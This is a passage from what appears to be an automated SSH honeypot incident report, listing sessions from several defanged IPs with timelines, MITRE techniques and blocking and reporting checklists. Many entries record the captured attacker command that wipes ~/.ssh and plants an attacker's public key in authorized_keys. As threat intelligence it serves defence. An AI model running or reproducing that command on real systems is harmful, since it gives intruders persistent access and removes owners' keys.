- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3611fca1519a

| Field | Detail |
|---|---|
| **Source IP** | `82.208.20[.]10` |
| **First Seen** | 2026-06-05 16:10 |
| **Last Seen** | 2026-06-05 16:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:10:04` | `cowrie.session.connect` |
| `2026-06-05 16:10:04` | `cowrie.client.version` |
| `2026-06-05 16:10:04` | `cowrie.client.kex` |
| `2026-06-05 16:10:05` | `cowrie.login.success` |
| `2026-06-05 16:10:05` | `cowrie.session.params` |
| `2026-06-05 16:10:05` | `cowrie.command.input` |
| `2026-06-05 16:10:05` | `cowrie.command.failed` |
| `2026-06-05 16:10:05` | `cowrie.log.closed` |
| `2026-06-05 16:10:05` | `cowrie.session.params` |
| `2026-06-05 16:10:05` | `cowrie.command.input` |
| `2026-06-05 16:10:05` | `cowrie.session.file_download` |
| `2026-06-05 16:10:05` | `cowrie.log.closed` |
| `2026-06-05 16:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.208.20[.]10` to AbuseIPDB if not already reported
- [ ] Block `82.208.20[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6658fc82f2d9

| Field | Detail |
|---|---|
| **Source IP** | `82.208.20[.]10` |
| **First Seen** | 2026-06-05 16:10 |
| **Last Seen** | 2026-06-05 16:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:10:13` | `cowrie.session.connect` |
| `2026-06-05 16:10:13` | `cowrie.client.version` |
| `2026-06-05 16:10:13` | `cowrie.client.kex` |
| `2026-06-05 16:10:13` | `cowrie.login.success` |
| `2026-06-05 16:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.208.20[.]10` to AbuseIPDB if not already reported
- [ ] Block `82.208.20[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b617da2d6665

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:11 |
| **Last Seen** | 2026-06-05 16:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:11:54` | `cowrie.session.connect` |
| `2026-06-05 16:11:54` | `cowrie.client.version` |
| `2026-06-05 16:11:54` | `cowrie.client.kex` |
| `2026-06-05 16:11:55` | `cowrie.login.success` |
| `2026-06-05 16:11:55` | `cowrie.session.params` |
| `2026-06-05 16:11:55` | `cowrie.command.input` |
| `2026-06-05 16:11:55` | `cowrie.command.failed` |
| `2026-06-05 16:11:55` | `cowrie.log.closed` |
| `2026-06-05 16:11:55` | `cowrie.session.params` |
| `2026-06-05 16:11:55` | `cowrie.command.input` |
| `2026-06-05 16:11:55` | `cowrie.session.file_download` |
| `2026-06-05 16:11:55` | `cowrie.log.closed` |
| `2026-06-05 16:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b13f37d48ac

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:11 |
| **Last Seen** | 2026-06-05 16:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:11:57` | `cowrie.session.connect` |
| `2026-06-05 16:11:57` | `cowrie.client.version` |
| `2026-06-05 16:11:57` | `cowrie.client.kex` |
| `2026-06-05 16:11:57` | `cowrie.login.success` |
| `2026-06-05 16:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb55d390be5d

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-05 16:14 |
| **Last Seen** | 2026-06-05 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:14:09` | `cowrie.session.connect` |
| `2026-06-05 16:14:09` | `cowrie.client.version` |
| `2026-06-05 16:14:09` | `cowrie.client.kex` |
| `2026-06-05 16:14:10` | `cowrie.login.success` |
| `2026-06-05 16:14:10` | `cowrie.session.params` |
| `2026-06-05 16:14:10` | `cowrie.command.input` |
| `2026-06-05 16:14:10` | `cowrie.command.failed` |
| `2026-06-05 16:14:10` | `cowrie.log.closed` |
| `2026-06-05 16:14:10` | `cowrie.session.params` |
| `2026-06-05 16:14:10` | `cowrie.command.input` |
| `2026-06-05 16:14:10` | `cowrie.session.file_download` |
| `2026-06-05 16:14:10` | `cowrie.log.closed` |
| `2026-06-05 16:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0acd83b5d36

| Field | Detail |
|---|---|
| **Source IP** | `103.180.213[.]153` |
| **First Seen** | 2026-06-05 16:14 |
| **Last Seen** | 2026-06-05 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:14:11` | `cowrie.session.connect` |
| `2026-06-05 16:14:11` | `cowrie.client.version` |
| `2026-06-05 16:14:11` | `cowrie.client.kex` |
| `2026-06-05 16:14:11` | `cowrie.login.success` |
| `2026-06-05 16:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.180.213[.]153` to AbuseIPDB if not already reported
- [ ] Block `103.180.213[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b2f755d9f9

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:17 |
| **Last Seen** | 2026-06-05 16:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:17:50` | `cowrie.session.connect` |
| `2026-06-05 16:17:50` | `cowrie.client.version` |
| `2026-06-05 16:17:51` | `cowrie.client.kex` |
| `2026-06-05 16:17:52` | `cowrie.login.success` |
| `2026-06-05 16:17:53` | `cowrie.session.params` |
| `2026-06-05 16:17:53` | `cowrie.command.input` |
| `2026-06-05 16:17:53` | `cowrie.command.failed` |
| `2026-06-05 16:17:53` | `cowrie.log.closed` |
| `2026-06-05 16:17:54` | `cowrie.session.params` |
| `2026-06-05 16:17:54` | `cowrie.command.input` |
| `2026-06-05 16:17:54` | `cowrie.session.file_download` |
| `2026-06-05 16:17:54` | `cowrie.log.closed` |
| `2026-06-05 16:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a58a985f7e0

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:17 |
| **Last Seen** | 2026-06-05 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:17:58` | `cowrie.session.connect` |
| `2026-06-05 16:17:58` | `cowrie.client.version` |
| `2026-06-05 16:17:58` | `cowrie.client.kex` |
| `2026-06-05 16:17:59` | `cowrie.login.success` |
| `2026-06-05 16:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f6450cedc2a

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:19 |
| **Last Seen** | 2026-06-05 16:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:19:48` | `cowrie.session.connect` |
| `2026-06-05 16:19:48` | `cowrie.client.version` |
| `2026-06-05 16:19:48` | `cowrie.client.kex` |
| `2026-06-05 16:19:49` | `cowrie.login.success` |
| `2026-06-05 16:19:49` | `cowrie.session.params` |
| `2026-06-05 16:19:49` | `cowrie.command.input` |
| `2026-06-05 16:19:49` | `cowrie.command.failed` |
| `2026-06-05 16:19:49` | `cowrie.log.closed` |
| `2026-06-05 16:19:49` | `cowrie.session.params` |
| `2026-06-05 16:19:49` | `cowrie.command.input` |
| `2026-06-05 16:19:49` | `cowrie.session.file_download` |
| `2026-06-05 16:19:49` | `cowrie.log.closed` |
| `2026-06-05 16:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c3a3e9dadfe

| Field | Detail |
|---|---|
| **Source IP** | `156.245.144[.]121` |
| **First Seen** | 2026-06-05 16:19 |
| **Last Seen** | 2026-06-05 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:19:51` | `cowrie.session.connect` |
| `2026-06-05 16:19:51` | `cowrie.client.version` |
| `2026-06-05 16:19:51` | `cowrie.client.kex` |
| `2026-06-05 16:19:51` | `cowrie.login.success` |
| `2026-06-05 16:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.144[.]121` to AbuseIPDB if not already reported
- [ ] Block `156.245.144[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8cd57bda02b

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:19 |
| **Last Seen** | 2026-06-05 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:19:56` | `cowrie.session.connect` |
| `2026-06-05 16:19:56` | `cowrie.client.version` |
| `2026-06-05 16:19:57` | `cowrie.client.kex` |
| `2026-06-05 16:19:58` | `cowrie.login.success` |
| `2026-06-05 16:19:59` | `cowrie.session.params` |
| `2026-06-05 16:19:59` | `cowrie.command.input` |
| `2026-06-05 16:19:59` | `cowrie.command.failed` |
| `2026-06-05 16:19:59` | `cowrie.log.closed` |
| `2026-06-05 16:20:00` | `cowrie.session.params` |
| `2026-06-05 16:20:00` | `cowrie.command.input` |
| `2026-06-05 16:20:00` | `cowrie.session.file_download` |
| `2026-06-05 16:20:00` | `cowrie.log.closed` |
| `2026-06-05 16:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9306f4fe0250

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:20 |
| **Last Seen** | 2026-06-05 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:20:04` | `cowrie.session.connect` |
| `2026-06-05 16:20:04` | `cowrie.client.version` |
| `2026-06-05 16:20:04` | `cowrie.client.kex` |
| `2026-06-05 16:20:05` | `cowrie.login.success` |
| `2026-06-05 16:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a5087fe626

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:20 |
| **Last Seen** | 2026-06-05 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:20:20` | `cowrie.session.connect` |
| `2026-06-05 16:20:20` | `cowrie.client.version` |
| `2026-06-05 16:20:20` | `cowrie.client.kex` |
| `2026-06-05 16:20:22` | `cowrie.login.success` |
| `2026-06-05 16:20:23` | `cowrie.session.params` |
| `2026-06-05 16:20:23` | `cowrie.command.input` |
| `2026-06-05 16:20:23` | `cowrie.command.failed` |
| `2026-06-05 16:20:23` | `cowrie.log.closed` |
| `2026-06-05 16:20:24` | `cowrie.session.params` |
| `2026-06-05 16:20:24` | `cowrie.command.input` |
| `2026-06-05 16:20:24` | `cowrie.session.file_download` |
| `2026-06-05 16:20:24` | `cowrie.log.closed` |
| `2026-06-05 16:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cfeffb8de0f

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:20 |
| **Last Seen** | 2026-06-05 16:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:20:27` | `cowrie.session.connect` |
| `2026-06-05 16:20:27` | `cowrie.client.version` |
| `2026-06-05 16:20:27` | `cowrie.client.kex` |
| `2026-06-05 16:20:28` | `cowrie.login.success` |
| `2026-06-05 16:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80cb7f61c273

| Field | Detail |
|---|---|
| **Source IP** | `47.79.124[.]231` |
| **First Seen** | 2026-06-05 16:21 |
| **Last Seen** | 2026-06-05 16:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:21:38` | `cowrie.session.connect` |
| `2026-06-05 16:21:38` | `cowrie.client.version` |
| `2026-06-05 16:21:38` | `cowrie.client.kex` |
| `2026-06-05 16:21:38` | `cowrie.login.success` |
| `2026-06-05 16:21:38` | `cowrie.session.params` |
| `2026-06-05 16:21:38` | `cowrie.command.input` |
| `2026-06-05 16:21:38` | `cowrie.command.failed` |
| `2026-06-05 16:21:38` | `cowrie.log.closed` |
| `2026-06-05 16:21:39` | `cowrie.session.params` |
| `2026-06-05 16:21:39` | `cowrie.command.input` |
| `2026-06-05 16:21:39` | `cowrie.session.file_download` |
| `2026-06-05 16:21:39` | `cowrie.log.closed` |
| `2026-06-05 16:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.79.124[.]231` to AbuseIPDB if not already reported
- [ ] Block `47.79.124[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a7dd63a46e

| Field | Detail |
|---|---|
| **Source IP** | `47.79.124[.]231` |
| **First Seen** | 2026-06-05 16:21 |
| **Last Seen** | 2026-06-05 16:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:21:40` | `cowrie.session.connect` |
| `2026-06-05 16:21:40` | `cowrie.client.version` |
| `2026-06-05 16:21:40` | `cowrie.client.kex` |
| `2026-06-05 16:21:40` | `cowrie.login.success` |
| `2026-06-05 16:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.79.124[.]231` to AbuseIPDB if not already reported
- [ ] Block `47.79.124[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94194405889

| Field | Detail |
|---|---|
| **Source IP** | `47.79.124[.]231` |
| **First Seen** | 2026-06-05 16:22 |
| **Last Seen** | 2026-06-05 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
